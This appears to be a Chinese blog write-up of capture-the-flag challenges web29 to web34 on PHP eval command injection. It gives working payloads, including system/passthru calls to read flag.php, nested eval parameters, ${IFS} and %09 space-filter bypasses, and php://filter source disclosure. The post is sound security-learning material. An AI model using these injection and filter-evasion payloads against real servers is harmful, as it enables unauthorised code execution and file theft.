---
title: Web
date: 2026-02-24 11:55:44
tags: [Web]
categories: Web
mathjax: true
top_img: /images/4.jpg
cover: /images/4.jpg
---

# 命令执行

<!-- more -->

## web29

![web29](/images/web29.png)

检查GET请求中是否存在名为'c'的参数，并将值赋给$c，正则匹配检查$c是否包含‘flag’，其中/i表示不区分大小写

，当没有匹配到‘flag’时执行eval函数

那先看看目录下有什么文件,使c=system('ls')

有flag.php

直接**c=system('tac f*')**

也可以cp复制文件,把flag .php 文件复制为 1.txt,再访问1.txt

即**c=system('cp fla*.php 1.txt');**

## web30

![web30](/images/web30.png)

这次多禁用了system和php

system还可以用exec和passthru代替

关于这两个函数的区别

![web30a](/images/web30a.png)

**?c=passthru('tac f*');**

**?c=echo exec('cat fla*');**

还有**c=passthru('cp fla*.php 1.txt');**

## web31

![web31](/images/web31.png)

限制了flag,system,php,cat,sort,shell,点号,空格,单引号

**1.嵌套参数:**

先使c=eval($_GET[1]),再1=system("tac flag.php");,

即**?c=eval($_GET[1]);&1=system("tac flag.php");**

**2.对于空格**,我们可以使用%09,浏览器访问时会自动把`%09`解码为 Tab 字符，执行效果和空格完全一样，同时避开了空格的过滤规则,也可以使用**$IFS$9**和**${IFS}**替代

𝐼𝐹𝑆绕过：在𝑙𝑖𝑛𝑢𝑥下，{IFS}是分隔符的意思，所以可以有${IFS}进行空格的替代。

𝐼𝐹𝑆9绕过：$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割

*?c=passthru("tac%09fla*");

?c=passthru("tac\\${IFS}fla*");

?c=passthru("tac\\${IFS}\\$9f*");

上述的反斜杠用于对$进行转义($在 URL / 服务器中是特殊字符，但在 Shell 中是环境变量标识，反斜杠解决了这个 “双重解析” 的冲突)

**3.读取文件**

`highlight_file()` 是 PHP 的核心函数，**作用是读取指定文件的内容，并按照 PHP 语法高亮的格式输出到页面上**

既然过滤了flag,base64编码后解码就行了,即(base64_decode("ZmxhZy5waHA=")

?c=highlight_file(base64_decode("ZmxhZy5waHA="));

也可替换成**show_source**

## web32

![web32](/images/web32.png)

限制了flag,system,php,cat,sort,shell,echo,点号,空格,单引号,分号,左括号

因为禁用了左括号,上面的思路看来行不通了

我们可以使用**include语句,include语句用于在执行流中插入写在其他文件中的有用的代码**

那先构造c=include $_GET[1]

发现空格和分号,前者可以用%09替代,后者可以用php闭合标签**?>**替代

即c=include%09$_GET[1]?>

&1=php://filter/convert.base64-encode/resource=flag.php

## web33

![web33](/images/web33.png)

?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

## web34

![web34](/images/web34.png)

?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

